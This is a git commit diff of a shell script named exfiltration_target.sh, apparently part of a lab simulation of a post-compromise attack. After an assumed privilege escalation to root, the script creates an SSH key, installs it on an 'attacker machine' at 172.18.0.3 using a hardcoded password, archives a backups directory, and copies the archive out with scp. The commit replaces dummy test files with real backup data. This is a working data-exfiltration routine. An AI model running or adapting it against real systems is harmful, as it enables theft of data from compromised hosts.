fc533d7eb4e9d551ff8b159f599a6c31cc0a996c
2002244 <90248075+2002244@users.noreply.github.com>
2022-10-23 00:58:52 +0800

    updated exfiltration source folder

--- exfiltration_target.sh
+++ exfiltration_target.sh
@@ -3,19 +3,23 @@
 # Run PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root
 
 # Generate SSH key pair and copy it to the attacker machine:
-ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver_test1 -N ""
-chmod 400 /root/.ssh/id_rsa_Cserver_test1.pub
-sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver_test1.pub vagrant@172.18.0.3
+ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver -N ""
+chmod 400 /root/.ssh/id_rsa_Cserver.pub
+sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver.pub vagrant@172.18.0.3
 
 # Generate some example files and tar them so that the .tar.gz file can be exfiltrated
-mkdir -p /root/test/stuff
-cd /root/test/stuff
-echo "owuoqwdjhoasjdo" > test1.txt
-echo "sadasdcasdac" > test2.txt
-echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
-echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt
-touch exfiltrate.tar.gz
-tar --exclude=exfiltrate.tar.gz -zcf exfiltrate.tar.gz .
+# mkdir -p /root/test/stuff
+# cd /root/test/stuff
+# echo "owuoqwdjhoasjdo" > test1.txt
+# echo "sadasdcasdac" > test2.txt
+# echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
+# echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt
+
+cd /home/resch/destination
+touch exfiltrate_backups.tar.gz
+tar --exclude=exfiltrate_backups.tar.gz -zcf exfiltrate_backups.tar.gz .
+
+cd /home/resch/.ssh
 
 # Send the tar file to attacker using scp
-scp -i /root/.ssh/id_rsa_Cserver_test1 /root/test/stuff/exfiltrate.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/
+scp -i /root/.ssh/id_rsa_Cserver /home/resch/destination/exfiltrate_backups.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/
